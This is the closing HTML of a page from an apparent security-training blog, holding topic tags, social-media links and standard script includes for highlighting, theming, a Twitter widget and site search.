web scanning
</a>
<a class="ui label" href=/tags/wireshark/ title=wireshark>
wireshark
</a>
</article>
</div>
</header>
<div class="ui relaxed grid dream-grid dream-back">
<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
<article class="ui segment">
<h3 class="ui header">Social Links</h3>
<nav class="ui secondary menu dream-menu dream-socials">
<div class=item>
<a href=/index.xml>
<i class="large rss square icon" title=RSS></i>
</a>
</div>
<div class=item>
<a href=mailto:classroom@anir0y.in>
<i class="large mail icon" title=Email></i>
</a>
</div>
<div class=item>
<a href=https://twitter.com/anir0y target=_blank>
<i class="large twitter icon" title=Twitter></i>
</a>
</div>
<div class=item>
<a href=https://facebook.com/anir0yofficial target=_blank>
<i class="large facebook icon" title=Facebook></i>
</a>
</div>
<div class=item>
<a href=https://instagram.com/anir0yofficial target=_blank>
<i class="large instagram icon" title=Instagram></i>
</a>
</div>
<div class=item>
<a href=https://www.linkedin.com/in/anir0y target=_blank>
<i class="large linkedin icon" title=Linkedin></i>
</a>
</div>
<div class=item>
<a href=https://github.com/anir0y target=_blank>
<i class="large github icon" title=GitHub></i>
</a>
</div>
</nav>
</article>
</div>
<div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
<article class="ui segment">
YOU CAN RESUE MY CONTENT
</article>
</div>
</div>
</div>
</section>
</div>
</div>
<script>window.defaultDark=null,window.backgroundDark="black",window.backgroundImageDark=null,window.darkNav=!0,window.hasTwitterEmbed=!0,window.hasTwitterEmbed&&(window.twttr=function(c,d,e){var b,f=c.getElementsByTagName(d)[0],a=window.twttr||{};return c.getElementById(e)?a:(b=c.createElement(d),b.id=e,b.src='https://platform.twitter.com/widgets.js',f.parentNode.insertBefore(b,f),a._e=[],a.ready=function(b){a._e.push(b)},a)}(document,'script','twitter-wjs'))</script>
<script src=/js/jquery.min.js></script>
<script src=/js/semantic.min.js></script>
<script src=/js/jquery.overlayScrollbars.min.js></script>
<script src=/js/header.js></script>
<script src=/js/main.js></script>
<script src=/js/theme.js></script>
<script src=/js/html2canvas.min.js></script>
<script src=/js/post.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/clojure.min.js></script>
<script src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js></script>
<script>hljs.initHighlightingOnLoad(),setHighlightTheme();function setHighlightTheme(){var a=localStore.getItem('hugo-theme-dream-is-dark'),b,c,d;a=a?a:window.defaultDark?'y':a,b="tomorrow",c="tomorrow-night",d=a==='y'?c:b,$('link[data-highlight]').attr('href','https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/'+d+'.min.css'),$('pre').css('background',a==='y'?'#333':'')}</script>
<div class="ui inverted segment" id=dream-search>
<div class="ui search">
<div class="ui transparent input">
<input class=prompt type=text placeholder=Search>
</div>
<div class=results></div>
</div>
</div>
<script>$(document).ready(function(){$.getJSON('https://classroom.anir0y.in/index.json',function(a){$('.ui.search').search({source:a,searchFields:['title'],showNoResults:!0})})})</script>
<script src=/js/search.js></script>
</body>
</html>